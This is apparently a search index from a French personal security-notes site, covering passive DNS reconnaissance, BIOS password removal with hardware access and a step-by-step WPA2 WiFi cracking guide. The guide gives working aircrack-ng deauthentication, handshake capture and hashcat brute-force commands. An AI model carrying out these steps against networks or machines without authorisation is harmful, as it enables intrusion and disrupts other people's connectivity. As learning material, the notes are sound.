protocole de demande et de r\u00e9ponse qui suit la sp\u00e9cification RFC 3912. Un serveur WHOIS \u00e9coute les demandes entrantes sur le port TCP 43. L'agent d'enregistrement du domaine est responsable de la mise \u00e0 jour des enregistrements WHOIS pour les noms de domaine qu'il loue. Le serveur WHOIS r\u00e9pond en fournissant diverses informations relatives au domaine demand\u00e9. En particulier, nous pouvons apprendre ce qui suit : Registrar : Par l'interm\u00e9diaire de quel bureau d'enregistrement le nom de domaine a-t-il \u00e9t\u00e9 enregistr\u00e9 ? Contact info of registrant : Nom, organisation, adresse, t\u00e9l\u00e9phone, entre autres. (sauf si elles sont cach\u00e9es par un service de protection de la vie priv\u00e9e) Creation, update and expiration : Quand le nom de domaine a-t-il \u00e9t\u00e9 enregistr\u00e9 pour la premi\u00e8re fois ? Quand a-t-il \u00e9t\u00e9 mis \u00e0 jour pour la derni\u00e8re fois ? Et quand doit-il \u00eatre renouvel\u00e9 ? Name Server : Quel est le serveur auquel il faut s'adresser pour r\u00e9soudre le nom de domaine ? whois google.com Gr\u00e2ce \u00e0 whois on s'int\u00e9resse le plus souvent au serveur DNS utilis\u00e9.","title":"Whois"},{"location":"reconnaissance_passive/#nslookup-et-dig","text":"nslookup signifie Name Server Look Up, \u00e7a permet de retrouver l'adresse IP d'un nom de domaine. La synthaxe est : nslookup [option] [nom de domaine] [serveur DNS \u00e0 interroger] Les serveurs DNS les plus connus sont : * Cloudflare avec 1.1.1.1 et 1.0.0.1 * Google avec 8.8.8.8 et 8.8.4.4 * Quad9 avec 9.9.9.9 et 149.112.112.112 Dans la partie [option] on peut choisir le type de r\u00e9sultat que l'on veut : option effet -type=A adresse IPv4 -type=AAAA adresse IPv6 -type=CNAME Nom Canonique -type=MX serveur mail -type=SOA \"Start of Authority\" -type=TXT TXT record","title":"nslookup et dig"},{"location":"reconnaissance_passive/#dig","text":"Pour des requ\u00eates DNS plus avanc\u00e9es et des fonctionnalit\u00e9s suppl\u00e9mentaires, on peut utiliser dig (Domain Information Groper) Comme pour nslookup on peut pr\u00e9ciser un type mais pas besoin de mettre \"-type=\", par exemple : dig test.com MX Pour pr\u00e9ciser le serveur DNS, on ajoute '@' : dig @8.8.8.8 test.com MX","title":"dig"},{"location":"reconnaissance_passive/#dnsdumpster","text":"DNSDumpster est un site qui permet de lister un certains nombre de sous-domaines. Et de faire un rendu visuel du mappage du site. Les outils de recherche DNS, tels que nslookup et dig, ne peuvent pas trouver les sous-domaines seuls. Le domaine que vous inspectez peut inclure un sous-domaine diff\u00e9rent qui peut r\u00e9v\u00e9ler beaucoup d'informations sur la cible. Par exemple, si tryhackme.com poss\u00e8de les sous-domaines wiki.tryhackme.com et webmail.tryhackme.com, vous voudrez en savoir plus sur ces deux sous-domaines, car ils peuvent contenir une mine d'informations sur votre cible. Il est possible que l'un de ces sous-domaines ait \u00e9t\u00e9 cr\u00e9\u00e9 et ne soit pas mis \u00e0 jour r\u00e9guli\u00e8rement. L'absence de mises \u00e0 jour r\u00e9guli\u00e8res entra\u00eene g\u00e9n\u00e9ralement la vuln\u00e9rabilit\u00e9 des services.","title":"DNSDumpster"},{"location":"reconnaissance_passive/#shodan","text":"Shodan est un site internet qui peut \u00eatre utile pour obtenir diverses informations sur le r\u00e9seau du client, sans s'y connecter activement. En outre, du c\u00f4t\u00e9 d\u00e9fensif, vous pouvez utiliser diff\u00e9rents services de Shodan.io pour conna\u00eetre les appareils connect\u00e9s et expos\u00e9s appartenant \u00e0 votre organisation. Shodan.io essaie de se connecter \u00e0 chaque appareil accessible en ligne pour construire un moteur de recherche de \"choses\" connect\u00e9es, contrairement \u00e0 un moteur de recherche de pages web. D\u00e8s qu'il obtient une r\u00e9ponse, il collecte toutes les informations relatives au service et les enregistre dans la base de donn\u00e9es pour les rendre consultables.","title":"Shodan"},{"location":"reset_mdp_BIOS_hardware_PC_fixe/","text":"Supprimer le mdp maitre BIOS d'un PC fixe avec acc\u00e8s au hardware Etape 1 : D\u00e9brancher la carte m\u00e8re et essayer d'allumer l'ordinateur \u00e0 vide afin de vider les condensateurs (on est jamais trop prudent !) Etape 2 : Retirer la pile de la carte m\u00e8re attendre 2 min. D\u00e9marrer \u00e0 vide. Remettre le pile. Rallumer l'ordinateur et regarder si le mdp a disparu. Etape 3 : si \u00e7a n'a pas fonctionn\u00e9 Regarder si la carte m\u00e8re a un cavalier au niveau du module BIOS, c'est ce qu'on appelle un NUC. Il devrait y avoir 3 pin avec marqu\u00e9 \"BIOS sec\" et le chevalet est sur 2 d'entre eux (normalement sur le pin 1 et 2) Etape 4 : Si c'est un NUC de nouvelle g\u00e9n\u00e9ration Retirer le cavalier (avant prendre une photo est conseill\u00e9 pour retenir sa position) Rebrancher et rallumer L'ordinateur va entrer dans un menu de configuration S\u00e9lectionner \"Supprimer le mot de passe de l'utilisateur et du superviseur du BIOS Eteindre et tout d\u00e9brancher Replacer le NUC sur les broches 1 et 2 (dans le bon sens Attention) Rebrancher et voil\u00e0 Etape 5 : Si c'est un NUC de premi\u00e8re g\u00e9n\u00e9ration Liste des mod\u00e8les de 1 \u00e8re g\u00e9n\u00e9ration : D33217CK D33217GKE DCP847SKE D53427RKE DC3217BY DC3217IYE DCCP847DYE DC53427HYE Etapes \u00e0 suivre : 1. Mettre le NUC sur les pins 2-3 (au lieu de 1-2) 2. Reprendre \u00e0 l'\u00e9tape 2 de la partie pr\u00e9c\u00e9dente","title":"PC fixe"},{"location":"reset_mdp_BIOS_hardware_PC_fixe/#supprimer-le-mdp-maitre-bios-dun-pc-fixe-avec-acces-au-hardware","text":"","title":"Supprimer le mdp maitre BIOS d'un PC fixe avec acc\u00e8s au hardware"},{"location":"reset_mdp_BIOS_hardware_PC_fixe/#etape-1","text":"D\u00e9brancher la carte m\u00e8re et essayer d'allumer l'ordinateur \u00e0 vide afin de vider les condensateurs (on est jamais trop prudent !)","title":"Etape 1 :"},{"location":"reset_mdp_BIOS_hardware_PC_fixe/#etape-2","text":"Retirer la pile de la carte m\u00e8re attendre 2 min. D\u00e9marrer \u00e0 vide. Remettre le pile. Rallumer l'ordinateur et regarder si le mdp a disparu.","title":"Etape 2 :"},{"location":"reset_mdp_BIOS_hardware_PC_fixe/#etape-3-si-ca-na-pas-fonctionne","text":"Regarder si la carte m\u00e8re a un cavalier au niveau du module BIOS, c'est ce qu'on appelle un NUC. Il devrait y avoir 3 pin avec marqu\u00e9 \"BIOS sec\" et le chevalet est sur 2 d'entre eux (normalement sur le pin 1 et 2)","title":"Etape 3 : si \u00e7a n'a pas fonctionn\u00e9"},{"location":"reset_mdp_BIOS_hardware_PC_fixe/#etape-4-si-cest-un-nuc-de-nouvelle-generation","text":"Retirer le cavalier (avant prendre une photo est conseill\u00e9 pour retenir sa position) Rebrancher et rallumer L'ordinateur va entrer dans un menu de configuration S\u00e9lectionner \"Supprimer le mot de passe de l'utilisateur et du superviseur du BIOS Eteindre et tout d\u00e9brancher Replacer le NUC sur les broches 1 et 2 (dans le bon sens Attention) Rebrancher et voil\u00e0","title":"Etape 4 : Si c'est un NUC de nouvelle g\u00e9n\u00e9ration"},{"location":"reset_mdp_BIOS_hardware_PC_fixe/#etape-5-si-cest-un-nuc-de-premiere-generation","text":"Liste des mod\u00e8les de 1 \u00e8re g\u00e9n\u00e9ration : D33217CK D33217GKE DCP847SKE D53427RKE DC3217BY DC3217IYE DCCP847DYE DC53427HYE Etapes \u00e0 suivre : 1. Mettre le NUC sur les pins 2-3 (au lieu de 1-2) 2. Reprendre \u00e0 l'\u00e9tape 2 de la partie pr\u00e9c\u00e9dente","title":"Etape 5 : Si c'est un NUC de premi\u00e8re g\u00e9n\u00e9ration"},{"location":"reset_mdp_BIOS_hardware_PC_portable/","text":"Supprimer le mdp maitre BIOS d'un PC fixe avec acc\u00e8s au hardware Etape 1 : D\u00e9brancher la carte m\u00e8re et essayer d'allumer l'ordinateur \u00e0 vide afin de vider les condensateurs (on est jamais trop prudent !) Etape 2 : Retirer la pile de la carte m\u00e8re attendre 2 min. D\u00e9marrer \u00e0 vide. Remettre le pile. Rallumer l'ordinateur et regarder si le mdp a disparu. Etape 3 : si \u00e7a n'a pas fonctionn\u00e9 C'est que le mot de passe est gard\u00e9 sur une petite puce \u00e0 c\u00f4t\u00e9.. L'action pr\u00e9c\u00e9dente a du remettre un mot de passe g\u00e9n\u00e9rique. Il faut alors trouver le mdp g\u00e9n\u00e9rique de l'ordinateur. Etape 4 : Retrouver le mdp g\u00e9n\u00e9rique du BIOS Retrouver le site du fabricant de l'ordinateur pour aller sur la page de r\u00e9cup\u00e9ration du mot de passe BIOS. Pour HP et Dell par exemple c'est : bios-pw . Attention : pour les PCs Asus je crois qu'il faut faire une requ\u00eate manuelle en demandant au support. Ils demanderont le num\u00e9ro de s\u00e9rie et la facture de l'ordinateur ou une carte d'identit\u00e9 Retrouver le num\u00e9ro de s\u00e9rie de l'odinateur (g\u00e9n\u00e9ralement c'est marqu\u00e9 derri\u00e8re l'ordinateur sur les petites \u00e9tiquettes) Rentrer le num\u00e9ro de s\u00e9rie et cliquer sur le r\u00e9cup\u00e9rer le mot de passe Rentrer le mdp g\u00e9n\u00e9r\u00e9 en mode QWERTY car de base le clavi\u00e9 est mapp\u00e9 en qwerty.","title":"PC portable"},{"location":"reset_mdp_BIOS_hardware_PC_portable/#supprimer-le-mdp-maitre-bios-dun-pc-fixe-avec-acces-au-hardware","text":"","title":"Supprimer le mdp maitre BIOS d'un PC fixe avec acc\u00e8s au hardware"},{"location":"reset_mdp_BIOS_hardware_PC_portable/#etape-1","text":"D\u00e9brancher la carte m\u00e8re et essayer d'allumer l'ordinateur \u00e0 vide afin de vider les condensateurs (on est jamais trop prudent !)","title":"Etape 1 :"},{"location":"reset_mdp_BIOS_hardware_PC_portable/#etape-2","text":"Retirer la pile de la carte m\u00e8re attendre 2 min. D\u00e9marrer \u00e0 vide. Remettre le pile. Rallumer l'ordinateur et regarder si le mdp a disparu.","title":"Etape 2 :"},{"location":"reset_mdp_BIOS_hardware_PC_portable/#etape-3-si-ca-na-pas-fonctionne","text":"C'est que le mot de passe est gard\u00e9 sur une petite puce \u00e0 c\u00f4t\u00e9.. L'action pr\u00e9c\u00e9dente a du remettre un mot de passe g\u00e9n\u00e9rique. Il faut alors trouver le mdp g\u00e9n\u00e9rique de l'ordinateur.","title":"Etape 3 : si \u00e7a n'a pas fonctionn\u00e9"},{"location":"reset_mdp_BIOS_hardware_PC_portable/#etape-4-retrouver-le-mdp-generique-du-bios","text":"Retrouver le site du fabricant de l'ordinateur pour aller sur la page de r\u00e9cup\u00e9ration du mot de passe BIOS. Pour HP et Dell par exemple c'est : bios-pw . Attention : pour les PCs Asus je crois qu'il faut faire une requ\u00eate manuelle en demandant au support. Ils demanderont le num\u00e9ro de s\u00e9rie et la facture de l'ordinateur ou une carte d'identit\u00e9 Retrouver le num\u00e9ro de s\u00e9rie de l'odinateur (g\u00e9n\u00e9ralement c'est marqu\u00e9 derri\u00e8re l'ordinateur sur les petites \u00e9tiquettes) Rentrer le num\u00e9ro de s\u00e9rie et cliquer sur le r\u00e9cup\u00e9rer le mot de passe Rentrer le mdp g\u00e9n\u00e9r\u00e9 en mode QWERTY car de base le clavi\u00e9 est mapp\u00e9 en qwerty.","title":"Etape 4 : Retrouver le mdp g\u00e9n\u00e9rique du BIOS"},{"location":"sites_utiles/","text":"Les sites int\u00e9ressants et utiles Protocoles FTP Doc technique FTP NFS Doc technique NFS 1 Doc technique NFS 2 Doc technique NFS 3 Doc technique NFS 4 Packages NFS nfs-common SMTP Doc technique SMTP SQL Doc technique SQL 1 Doc technique SQL 2 Doc technique SQL 3 ICMP Doc technique ICMP TCP Doc technique TCP DNS Doc technique DNS HTTP Doc technique HTTP Exploitations Exploits de services distants Liste d'exploits de services distants : mitre Article vuln\u00e9rabilit\u00e9 VPN multiples Speciale CTF services connect\u00e9s simples","title":"Les sites utiles"},{"location":"sites_utiles/#les-sites-interessants-et-utiles","text":"","title":"Les sites int\u00e9ressants et utiles"},{"location":"sites_utiles/#protocoles","text":"","title":"Protocoles"},{"location":"sites_utiles/#ftp","text":"Doc technique FTP","title":"FTP"},{"location":"sites_utiles/#nfs","text":"Doc technique NFS 1 Doc technique NFS 2 Doc technique NFS 3 Doc technique NFS 4","title":"NFS"},{"location":"sites_utiles/#packages-nfs","text":"nfs-common","title":"Packages NFS"},{"location":"sites_utiles/#smtp","text":"Doc technique SMTP","title":"SMTP"},{"location":"sites_utiles/#sql","text":"Doc technique SQL 1 Doc technique SQL 2 Doc technique SQL 3","title":"SQL"},{"location":"sites_utiles/#icmp","text":"Doc technique ICMP","title":"ICMP"},{"location":"sites_utiles/#tcp","text":"Doc technique TCP","title":"TCP"},{"location":"sites_utiles/#dns","text":"Doc technique DNS","title":"DNS"},{"location":"sites_utiles/#http","text":"Doc technique HTTP","title":"HTTP"},{"location":"sites_utiles/#exploitations","text":"","title":"Exploitations"},{"location":"sites_utiles/#exploits-de-services-distants","text":"Liste d'exploits de services distants : mitre Article vuln\u00e9rabilit\u00e9 VPN multiples","title":"Exploits de services distants"},{"location":"sites_utiles/#speciale-ctf","text":"services connect\u00e9s simples","title":"Speciale CTF"},{"location":"vide/","text":"Cette page arrivera bient\u00f4t !","title":"Windows"},{"location":"vide/#cette-page-arrivera-bientot","text":"","title":"Cette page arrivera bient\u00f4t !"},{"location":"web_exploit_bases/","text":"","title":"Les bases"},{"location":"wifi-cracking/","text":"Cracker le mdp d'un wifi Les types de wifi : Il ya 3 types de r\u00e9seau wifi : WEP Les r\u00e9seaux WEP pour Wired Equivalent Privacy ne sont normalement plus utilis\u00e9s car ils a \u00e9t\u00e9 prouv\u00e9 qu'ils ont une faille de s\u00e9curit\u00e9 qui permet, apr\u00e8s avoir captur\u00e9 assez de paquets, de faire une attaque statistique pour d\u00e9terminer le mdp. WPA2-PSK Les r\u00e9seaux Wifi auxquels vous vous connectez en fournissant un mot de passe qui est le m\u00eame pour tout le monde WPA2-EAP R\u00e9seaux Wifi auxquels vous vous authentifiez en fournissant un nom d'utilisateur et un mot de passe, qui sont envoy\u00e9s \u00e0 un serveur RADIUS(Un serveur pour l'authentification des clients, pas seulement pour le wifi). Type d'authentification Les r\u00e9seaux WPA2 utilise une authentification appel\u00e9e 4-way handshake. Globalement, sans rentrer dans les d\u00e9tails \u00e7a permet au client et \u00e0 l'AP de prouver qu'ils connaissent la cl\u00e9, sans se le dire l'un \u00e0 l'autre. Le WPA et le WPA2 utilisent pratiquement la m\u00eame m\u00e9thode d'authentification, de sorte que les attaques sont les m\u00eames. Vuln\u00e9rabilit\u00e9 Il n'y en a pas de connu pour le WPA2, il faut donc passer par une attaque bruteforce. A noter que le nombre de caract\u00e8re minimal pour un mdp de WPA2 c'est 8. Les cl\u00e9s du WPA sont d\u00e9riv\u00e9es de l'ESSID (Un SSID (Le \"nom\" du r\u00e9seau que vous voyez lorsque vous essayez de vous connecter) qui peut s'appliquer \u00e0 plusieurs points d'acc\u00e8s, par exemple un bureau d'entreprise, formant normalement un r\u00e9seau plus grand. Pour Aircrack, ils font normalement r\u00e9f\u00e9rence au r\u00e9seau que vous attaquez.) et du mot de passe du r\u00e9seau. L'ESSID agit comme un sel, ce qui rend les attaques par dictionnaire plus difficiles. Cela signifie que pour un mot de passe donn\u00e9, la cl\u00e9 variera toujours pour chaque point d'acc\u00e8s. Cela signifie qu'\u00e0 moins de calculer \u00e0 l'avance le dictionnaire pour ce seul point d'acc\u00e8s/adresse MAC, vous devrez essayer des mots de passe jusqu'\u00e0 ce que vous trouviez le bon. Outil utilis\u00e9 Pour les r\u00e9seaux wifi on va utiliser l'outil aircrack-ng pour le bruteforce : site de l'outil Package de aircrack-ng Nom du package Description aircrack-ng outil de bruteforce airmon-ng outil pour mettre une interface en mode monitor airodump-ng outil pour capturer les paquets sur un r\u00e9seau wifi aireplay-ng outil pour injecter des paquets sur un r\u00e9seau wifi airdecap-ng outil pour d\u00e9crypter les paquets captur\u00e9s airbase-ng outil pour cr\u00e9er un point d'acc\u00e8s wifi airtun-ng outil pour cr\u00e9er un tunnel wifi packetforge-ng outil pour cr\u00e9er des paquets wifi airdecloak-ng outil pour d\u00e9crypter les paquets captur\u00e9s airolib-ng outil pour g\u00e9rer les bases de donn\u00e9es de mots de passe airserv-ng outil pour cr\u00e9er un serveur de capture de paquets buddy-ng outil pour cr\u00e9er un serveur de capture de paquets ivstools outil pour g\u00e9rer les fi chiers .ivs easside-ng outil pour d\u00e9crypter les paquets captur\u00e9s tkiptun-ng outil pour d\u00e9crypter les paquets captur\u00e9s wesside-ng outil pour d\u00e9crypter les paquets captur\u00e9s Attaque de r\u00e9seau WPA Mettre l'interface r\u00e9seau en mode monitor Si l'interface r\u00e9seau n'est pas en mode monitor, on va utiliser l'outil airmon-ng pour la mettre en mode monitor (petit tips : pour voir l'\u00e9tat de l'interface r\u00e9seau sans fil on peut utiliser la commande iwconfig ). La premi\u00e8re \u00e9tape est de terminer tous les processus qui utilisent l'interface r\u00e9seau sans fil. Pour cela, on va utiliser la commande suivante : airmon-ng check kill Ensuite, on va mettre l'interface r\u00e9seau sans fil en mode monitor. Pour cela, on va utiliser la commande suivante : airmon-ng start <interface> Exemple avec wlan0 : airmon-ng start wlan0 Le nom de l'interface r\u00e9seau sans fil en mode monitor est le nom de l'interface r\u00e9seau sans fil suivi de mon . Exemple : wlan0 devient wlan0mon D\u00e9couvrir les r\u00e9seaux wifi Pour d\u00e9couvrir les r\u00e9seaux wifi \u00e0 proximit\u00e9, on va utiliser l'outil airodump-ng . Pour cela, on va utiliser la commande suivante : airodump-ng <interface> Petit rappel, il faut que l'interface soit en mode monitor soit avec le mon \u00e0 la fin du nom de l'interface. Si on ne veut afficher qu'une seule adresse MAC, on peut utiliser la commande suivante : airodump-ng <interface> --bssid <bssid> ou airodump-ng <interface> -d <MAC address> Capturer les paquets Pour attaquer un r\u00e9seau wifi WPA, il faut d'abord capturer le handshake. Pour cela, on va utiliser l'outil airodump-ng qui va nous permettre de capturer les paquets qui transitent sur le r\u00e9seau wifi. Pour cela, on va utiliser la commande suivante : airodump-ng <interface> -c <channel> --bssid <bssid> -w <file> Flag Description interface nom de l'interface r\u00e9seau sans fil en mode monitor channel canal du r\u00e9seau wifi bssid adresse MAC du point d'acc\u00e8s file nom du fichier de sortie dans lequel va s'\u00e9crire les paquets captur\u00e9s D\u00e9authentifier un client Pendant que la commande de capture de paquet est lanc\u00e9e, on va utiliser l'outil aireplay-ng pour d\u00e9authentifier un client du r\u00e9seau wifi. Cela va obliger le client \u00e0 se r\u00e9authentifier. Si tout se passe bien, on devrait capturer cette r\u00e9authentification dans notre fichier de sortie de airodump-ng. Pour d\u00e9authentifier un client, on va utiliser la commande suivante : aireplay-ng --deauth 0 -a <bssid> -D <interface> Ci-dessus, on d\u00e9authentifie tous les clients du r\u00e9seau wifi. Si on veut d\u00e9authentifier un seul client, on peut utiliser la commande suivante : aireplay-ng --deauth 0 -a <bssid> -c <client> <interface> Flag Description deauth nombre de d\u00e9authentification \u00e0 envoyer (0 signifie une attaque continue) a adresse MAC du point d'acc\u00e8s interface nom de l'interface r\u00e9seau sans fil en mode monitor c adresse MAC du client \u00e0 d\u00e9authentifier En cas d'erreur : wlan0mon is on channel 3, but the AP uses channel 11 on peut utiliser la commande suivante : sudo airmon-ng start wlan0mon 3 Puis relancer la commande de d\u00e9authentification. Retirer le mode monitor Une fois que l'on a captur\u00e9 le handshake, on peut retirer le mode monitor de l'interface r\u00e9seau sans fil. Pour cela, on va utiliser la commande suivante : airmon-ng stop <interface> Lire les r\u00e9sultats captur\u00e9s (non obligatoire) On a donn\u00e9 un nom \u00e0 notre fichier de sortie. Cela va g\u00e9n\u00e9rer 5 fichiers : - .csv - -01.cap - -01.csv - -01.kismet.csv Le fichier qui nous int\u00e9resse est le fichier -01.cap . C'est dans ce fichier que se trouve le handshake. On utilise peut donc Wireshark pour lire le fichier -01.cap . On peut utiliser la commande suivante : wireshark <file>-01.cap On met un filtre pour identifier le handshake : eapol (le handshake est compos\u00e9 de 4 paquets eapol). Et on cherche la suite des 4 paquets num\u00e9rot\u00e9s de 1 \u00e0 4. Cracker le handshake - Dictionnaire Pour cracker le handshake, on va utiliser l'outil aircrack-ng . Pour cela, on va utiliser la commande suivante : aircrack-ng <file>-01.cap -w <wordlist> Laisser tourner ... ET VOILA ! Remarque : Cette technique fonctionne uniquement avec des mots de passe faibles. Pour des mots de passe plus complexes, il faut utiliser une autre technique. Crack le handshake - Bruteforce (pour mdp non conventionnels) Pour faire du bruteforce, on va utiliser hashcat . Mais pour \u00e7a il faut convertir le fichier contenant le hash du handshake en un format compr\u00e9hensible par hashcat et correspondant au bon type de hash. Avant on aurait utilis\u00e9 cap2hccapx mais maitenant le format hccapx n'est plus utilis\u00e9. Il faut le convertir en hc22000 . Je l'ai fait en utilisant un site web (pas une bonne pratique du tout, il doit exister un outil) Ensuite il faut lacer hashcat en pr\u00e9cisant le type d'attaque (bruteforce ou dictionnaire ou les 2) et le type de hash (22000 pour du wpa/wpa2). hashcat -a <type d'attaque> -m 22000 <file>.hc22000 <wordlist> Pas besoin de wordlist si l'attaque est bruteforce uniquement ( -a 3 )","title":"Wifi mdp cracking"},{"location":"wifi-cracking/#cracker-le-mdp-dun-wifi","text":"","title":"Cracker le mdp d'un wifi"},{"location":"wifi-cracking/#les-types-de-wifi","text":"Il ya 3 types de r\u00e9seau wifi :","title":"Les types de wifi :"},{"location":"wifi-cracking/#wep","text":"Les r\u00e9seaux WEP pour Wired Equivalent Privacy ne sont normalement plus utilis\u00e9s car ils a \u00e9t\u00e9 prouv\u00e9 qu'ils ont une faille de s\u00e9curit\u00e9 qui permet, apr\u00e8s avoir captur\u00e9 assez de paquets, de faire une attaque statistique pour d\u00e9terminer le mdp.","title":"WEP"},{"location":"wifi-cracking/#wpa2-psk","text":"Les r\u00e9seaux Wifi auxquels vous vous connectez en fournissant un mot de passe qui est le m\u00eame pour tout le monde","title":"WPA2-PSK"},{"location":"wifi-cracking/#wpa2-eap","text":"R\u00e9seaux Wifi auxquels vous vous authentifiez en fournissant un nom d'utilisateur et un mot de passe, qui sont envoy\u00e9s \u00e0 un serveur RADIUS(Un serveur pour l'authentification des clients, pas seulement pour le wifi).","title":"WPA2-EAP"},{"location":"wifi-cracking/#type-dauthentification","text":"Les r\u00e9seaux WPA2 utilise une authentification appel\u00e9e 4-way handshake. Globalement, sans rentrer dans les d\u00e9tails \u00e7a permet au client et \u00e0 l'AP de prouver qu'ils connaissent la cl\u00e9, sans se le dire l'un \u00e0 l'autre. Le WPA et le WPA2 utilisent pratiquement la m\u00eame m\u00e9thode d'authentification, de sorte que les attaques sont les m\u00eames.","title":"Type d'authentification"},{"location":"wifi-cracking/#vulnerabilite","text":"Il n'y en a pas de connu pour le WPA2, il faut donc passer par une attaque bruteforce. A noter que le nombre de caract\u00e8re minimal pour un mdp de WPA2 c'est 8. Les cl\u00e9s du WPA sont d\u00e9riv\u00e9es de l'ESSID (Un SSID (Le \"nom\" du r\u00e9seau que vous voyez lorsque vous essayez de vous connecter) qui peut s'appliquer \u00e0 plusieurs points d'acc\u00e8s, par exemple un bureau d'entreprise, formant normalement un r\u00e9seau plus grand. Pour Aircrack, ils font normalement r\u00e9f\u00e9rence au r\u00e9seau que vous attaquez.) et du mot de passe du r\u00e9seau. L'ESSID agit comme un sel, ce qui rend les attaques par dictionnaire plus difficiles. Cela signifie que pour un mot de passe donn\u00e9, la cl\u00e9 variera toujours pour chaque point d'acc\u00e8s. Cela signifie qu'\u00e0 moins de calculer \u00e0 l'avance le dictionnaire pour ce seul point d'acc\u00e8s/adresse MAC, vous devrez essayer des mots de passe jusqu'\u00e0 ce que vous trouviez le bon.","title":"Vuln\u00e9rabilit\u00e9"},{"location":"wifi-cracking/#outil-utilise","text":"Pour les r\u00e9seaux wifi on va utiliser l'outil aircrack-ng pour le bruteforce : site de l'outil","title":"Outil utilis\u00e9"},{"location":"wifi-cracking/#package-de-aircrack-ng","text":"Nom du package Description aircrack-ng outil de bruteforce airmon-ng outil pour mettre une interface en mode monitor airodump-ng outil pour capturer les paquets sur un r\u00e9seau wifi aireplay-ng outil pour injecter des paquets sur un r\u00e9seau wifi airdecap-ng outil pour d\u00e9crypter les paquets captur\u00e9s airbase-ng outil pour cr\u00e9er un point d'acc\u00e8s wifi airtun-ng outil pour cr\u00e9er un tunnel wifi packetforge-ng outil pour cr\u00e9er des paquets wifi airdecloak-ng outil pour d\u00e9crypter les paquets captur\u00e9s airolib-ng outil pour g\u00e9rer les bases de donn\u00e9es de mots de passe airserv-ng outil pour cr\u00e9er un serveur de capture de paquets buddy-ng outil pour cr\u00e9er un serveur de capture de paquets ivstools outil pour g\u00e9rer les fi chiers .ivs easside-ng outil pour d\u00e9crypter les paquets captur\u00e9s tkiptun-ng outil pour d\u00e9crypter les paquets captur\u00e9s wesside-ng outil pour d\u00e9crypter les paquets captur\u00e9s","title":"Package de aircrack-ng"},{"location":"wifi-cracking/#attaque-de-reseau-wpa","text":"","title":"Attaque de r\u00e9seau WPA"},{"location":"wifi-cracking/#mettre-linterface-reseau-en-mode-monitor","text":"Si l'interface r\u00e9seau n'est pas en mode monitor, on va utiliser l'outil airmon-ng pour la mettre en mode monitor (petit tips : pour voir l'\u00e9tat de l'interface r\u00e9seau sans fil on peut utiliser la commande iwconfig ). La premi\u00e8re \u00e9tape est de terminer tous les processus qui utilisent l'interface r\u00e9seau sans fil. Pour cela, on va utiliser la commande suivante : airmon-ng check kill Ensuite, on va mettre l'interface r\u00e9seau sans fil en mode monitor. Pour cela, on va utiliser la commande suivante : airmon-ng start <interface> Exemple avec wlan0 : airmon-ng start wlan0 Le nom de l'interface r\u00e9seau sans fil en mode monitor est le nom de l'interface r\u00e9seau sans fil suivi de mon . Exemple : wlan0 devient wlan0mon","title":"Mettre l'interface r\u00e9seau en mode monitor"},{"location":"wifi-cracking/#decouvrir-les-reseaux-wifi","text":"Pour d\u00e9couvrir les r\u00e9seaux wifi \u00e0 proximit\u00e9, on va utiliser l'outil airodump-ng . Pour cela, on va utiliser la commande suivante : airodump-ng <interface> Petit rappel, il faut que l'interface soit en mode monitor soit avec le mon \u00e0 la fin du nom de l'interface. Si on ne veut afficher qu'une seule adresse MAC, on peut utiliser la commande suivante : airodump-ng <interface> --bssid <bssid> ou airodump-ng <interface> -d <MAC address>","title":"D\u00e9couvrir les r\u00e9seaux wifi"},{"location":"wifi-cracking/#capturer-les-paquets","text":"Pour attaquer un r\u00e9seau wifi WPA, il faut d'abord capturer le handshake. Pour cela, on va utiliser l'outil airodump-ng qui va nous permettre de capturer les paquets qui transitent sur le r\u00e9seau wifi. Pour cela, on va utiliser la commande suivante : airodump-ng <interface> -c <channel> --bssid <bssid> -w <file> Flag Description interface nom de l'interface r\u00e9seau sans fil en mode monitor channel canal du r\u00e9seau wifi bssid adresse MAC du point d'acc\u00e8s file nom du fichier de sortie dans lequel va s'\u00e9crire les paquets captur\u00e9s","title":"Capturer les paquets"},{"location":"wifi-cracking/#deauthentifier-un-client","text":"Pendant que la commande de capture de paquet est lanc\u00e9e, on va utiliser l'outil aireplay-ng pour d\u00e9authentifier un client du r\u00e9seau wifi. Cela va obliger le client \u00e0 se r\u00e9authentifier. Si tout se passe bien, on devrait capturer cette r\u00e9authentification dans notre fichier de sortie de airodump-ng. Pour d\u00e9authentifier un client, on va utiliser la commande suivante : aireplay-ng --deauth 0 -a <bssid> -D <interface> Ci-dessus, on d\u00e9authentifie tous les clients du r\u00e9seau wifi. Si on veut d\u00e9authentifier un seul client, on peut utiliser la commande suivante : aireplay-ng --deauth 0 -a <bssid> -c <client> <interface> Flag Description deauth nombre de d\u00e9authentification \u00e0 envoyer (0 signifie une attaque continue) a adresse MAC du point d'acc\u00e8s interface nom de l'interface r\u00e9seau sans fil en mode monitor c adresse MAC du client \u00e0 d\u00e9authentifier En cas d'erreur : wlan0mon is on channel 3, but the AP uses channel 11 on peut utiliser la commande suivante : sudo airmon-ng start wlan0mon 3 Puis relancer la commande de d\u00e9authentification.","title":"D\u00e9authentifier un client"},{"location":"wifi-cracking/#retirer-le-mode-monitor","text":"Une fois que l'on a captur\u00e9 le handshake, on peut retirer le mode monitor de l'interface r\u00e9seau sans fil. Pour cela, on va utiliser la commande suivante : airmon-ng stop <interface>","title":"Retirer le mode monitor"},{"location":"wifi-cracking/#lire-les-resultats-captures-non-obligatoire","text":"On a donn\u00e9 un nom \u00e0 notre fichier de sortie. Cela va g\u00e9n\u00e9rer 5 fichiers : - .csv - -01.cap - -01.csv - -01.kismet.csv Le fichier qui nous int\u00e9resse est le fichier -01.cap . C'est dans ce fichier que se trouve le handshake. On utilise peut donc Wireshark pour lire le fichier -01.cap . On peut utiliser la commande suivante : wireshark <file>-01.cap On met un filtre pour identifier le handshake : eapol (le handshake est compos\u00e9 de 4 paquets eapol). Et on cherche la suite des 4 paquets num\u00e9rot\u00e9s de 1 \u00e0 4.","title":"Lire les r\u00e9sultats captur\u00e9s (non obligatoire)"},{"location":"wifi-cracking/#cracker-le-handshake-dictionnaire","text":"Pour cracker le handshake, on va utiliser l'outil aircrack-ng . Pour cela, on va utiliser la commande suivante : aircrack-ng <file>-01.cap -w <wordlist> Laisser tourner ... ET VOILA ! Remarque : Cette technique fonctionne uniquement avec des mots de passe faibles. Pour des mots de passe plus complexes, il faut utiliser une autre technique.","title":"Cracker le handshake - Dictionnaire"},{"location":"wifi-cracking/#crack-le-handshake-bruteforce-pour-mdp-non-conventionnels","text":"Pour faire du bruteforce, on va utiliser hashcat . Mais pour \u00e7a il faut convertir le fichier contenant le hash du handshake en un format compr\u00e9hensible par hashcat et correspondant au bon type de hash. Avant on 